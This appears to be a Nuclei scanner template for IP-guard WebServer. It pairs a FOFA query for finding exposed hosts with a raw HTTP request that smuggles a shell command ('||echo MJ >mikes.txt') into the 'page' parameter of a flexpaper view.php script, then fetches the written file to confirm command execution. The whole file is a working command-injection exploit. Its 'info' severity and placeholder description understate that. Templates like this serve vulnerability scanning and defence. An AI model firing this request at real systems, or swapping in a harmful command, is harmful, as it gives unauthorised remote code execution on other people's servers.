id: IP-guard
info:
  name: IP-guard WebServer
  author: mike
  severity: info
  description: xxx
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="IP-guard" && icon_hash="2030860561"
http:
  - raw:
      - |
        GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+MJ+%3Emikes.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Cookie: ipg_session=1ee3212ad0cc6650bb92892f5faf668d58054772; PHPSESSID=d2b37e80dc2216e7dfd0fdbc611a36cd
        DNT: 1
        Connection: close
        Upgrade-Insecure-Requests: 1

      - |
        GET /ipg/static/appr/lib/flexpaper/php/mikes.txt HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "MJ"

